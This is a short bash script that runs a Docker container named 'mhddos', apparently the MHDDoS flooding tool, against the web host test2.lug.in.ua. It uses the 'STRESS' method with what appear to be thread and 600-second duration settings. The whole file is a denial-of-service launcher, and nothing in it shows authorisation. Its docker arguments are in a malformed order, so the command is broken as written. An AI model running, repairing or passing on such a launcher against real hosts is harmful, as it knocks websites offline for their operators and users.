#!/usr/bin/env bash

cd ..
docker run STRESS http://test2.lug.in.ua 0 2 0 10 600 true --name mhddos -P dyman/battleship_cannon
